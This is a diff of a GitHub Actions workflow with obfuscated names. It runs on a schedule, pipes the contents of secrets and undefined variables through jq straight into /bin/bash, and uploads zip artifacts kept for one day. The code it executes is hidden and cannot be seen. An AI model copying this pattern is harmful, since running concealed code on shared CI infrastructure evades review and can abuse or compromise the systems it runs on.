@@ -1,19 +1,26 @@
 name: xianguanghefeng
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '5 2/6 * * *'
-jobs:  # 25968
+    - cron: '44 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xianguanghefeng
         env:
-          sq4853: ${{ secrets.sq4853 }}
+          stdkj40986: ${{ secrets.stdkj40986 }}
         run: |
-          echo $sq4853 | jq -r .adfi50 | /bin/bash
-          echo $lllw4 | jq -r .dgbxp6021 | /bin/bash
-          echo $zgrmu7481 | jq -r .iqtw1111 | /bin/bash
+          printf '%s' "$stdkj40986" | jq -r .abk07017 | /bin/bash
+          printf '%s' "$gmxfo54" | jq -r .lua275 | /bin/bash
+          echo $rjr5489 | jq -r .v785 | /bin/bash
+          printf '%s' "$hwr3" | jq -r .ol7 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2d4iTWFW
+          path: "*.zip"
+          retention-days: 1
